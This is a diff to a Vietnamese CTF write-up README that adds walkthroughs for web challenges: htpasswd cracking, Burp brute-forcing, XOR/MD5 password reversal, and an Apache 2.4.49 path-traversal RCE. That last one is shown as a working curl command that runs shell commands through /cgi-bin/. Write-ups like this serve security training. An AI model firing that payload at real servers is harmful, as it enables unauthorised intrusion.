@@ -33,8 +33,10 @@
 - [Lucky Number](https://github.com/DucThinh47/VibloCTF-Writeups#lucky-number)
 - [Login with js](https://github.com/DucThinh47/VibloCTF-Writeups#login-with-js)
 - [Config Basic](https://github.com/DucThinh47/VibloCTF-Writeups#config-basic)
-- [Cat Pictures]()
-- [Unbreakable Login]()
+- [Cat Pictures](https://github.com/DucThinh47/VibloCTF-Writeups#cat-pictures)
+- [Unbreakable Login](https://github.com/DucThinh47/VibloCTF-Writeups#unbreakable-login)
+- [Do you know Brute Force]()
+- [Easy Password]()
 #### Web7
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image0.png?raw=true)
@@ -1236,23 +1238,23 @@ Thấy rằng server sử dụng:
 
 #### Cat Pictures
 
-![img](144)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image144.png?raw=true)
 
 Dùng dirsearch, tôi tìm được endpoint ẩn là `/.htpasswd`, truy cập endpoint này, file `htpasswd` được tự động tải về với nội dung như sau:
 
-![img](145)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image145.png?raw=true)
 
 Password đã bị mã hóa, sử dụng `hashcat`, tôi tìm được mật khẩu là `Welcome!`. Lấy thông tin đăng nhập là `Viblo:Welcome!`, truy cập `/login` và tìm được flag:
 
-![img](146)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image146.png?raw=true)
 
 #### Unbreakable Login
 
-![img](147)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image147.png?raw=true)
 
 Xem source code, tìm được file `/main.js`, tuy nhiên nội dung file đã bị obfuscation:
 
-![img](148)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image148.png?raw=true)
 
 Sử dụng tool, tìm được nội dung file gốc là:
 
@@ -1273,22 +1275,74 @@ Sử dụng tool, tìm được nội dung file gốc là:
 
 Thử login với thông tin đăng nhập là `admin:admin`:
 
-![img](149)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image149.png?raw=true)
 
-Chỉ là một bức ảnh giả flag. Tôi đã thử khai thác SQLi nhưng không có hiệu quả. Xem lại request và response, tôi để ý Server được sử dụng là `Apache/2.4.49 (Unix)`, có một lỗ hổng RCE liên quan đến server này, tôi thử gọi `POST` tới `/bin/sh` (đi xuyên từ `/cgi-bin/`) và tiêm lệnh vào `STDIN`. `CGI` yêu cầu in header trước rồi mới nội dung, nên thêm `echo Content-Type: text/plain; echo`:
+Chỉ là một bức ảnh giả flag. Tôi đã thử khai thác SQLi nhưng không có hiệu quả. Xem lại request và response, tôi để ý Server được sử dụng là `Apache/2.4.49 (Unix)`, 
+
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image150.png?raw=true)
+
+Có một lỗ hổng RCE liên quan đến server này, tôi thử gọi `POST` tới `/bin/sh` (đi xuyên từ `/cgi-bin/`) và tiêm lệnh vào `STDIN`. `CGI` yêu cầu in header trước rồi mới nội dung, nên thêm `echo Content-Type: text/plain; echo`:
 
     curl -s --path-as-is \
     -X POST 'http://172.104.49.143:5015/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' \
     -H 'Content-Type: text/plain' \
     --data-binary $'echo Content-Type: text/plain\n\necho; id'
 
-![img](151)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image151.png?raw=true)
 
 => RCE thành công. Tiếp theo tìm và đọc flag:
 
-![img](152)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image152.png?raw=true)
 
+#### Do you know Brute Force
 
+![img](153)
+
+Kiểm tra source code, tìm được list username và password:
+
+![img](154)
+
+Sử dụng Burp Intruder để brute-force, tìm ra username và password, đồng thời thêm vào phần Grep-Match chuỗi `Flag` và tìm ra flag:
+
+![img](155)
+
+#### Easy Password
+
+![img](156)
+
+Truy cập `/robots.txt`, tìm được endpoint ẩn `/s3cr3t_pass.txt`:
+
+![img](157)
+
+Truy cập `/s3cr3t_pass.txt`:
+
+![img](158)
+
+Phân tích đoạn code này:
+- Là một “check mật khẩu” kiểu `XOR-obfuscation`.
+- Server giữ 2 hằng:
+    - `key = "5ba00d5a7ae52842c92fcd618967933a"` (32 ký tự ASCII – trông như hex)
+    - `this_password = "UVMEBQdSV1YGAgZQVA0NBVtdAFRSAldVXg1QB1wBC1g="` (base64)
+
+Khi gửi password, server sẽ so sánh:
+
+    base64_decode($this_password) === STRXOR($key, md5(password))
+
+Nghĩa là so sánh:
+
+    md5(password) == key XOR base64_decode(this_password)
+
+=> Giải ngược: decode base64 rồi XOR với key để thu được giá trị MD5 đích mà password phải cho ra.
+
+    base64_decode(this_password) XOR key = d1e576b71ccef5978d221fadf4f0e289
+
+Tiếp theo để crach MD5, tôi sử dụng `hashcat`:
+
+![img](159)
+
+=> Tìm được password là `superpassword`, nhập vào trang chủ và tìm được flag:
+
+![img](160)
 
 
 
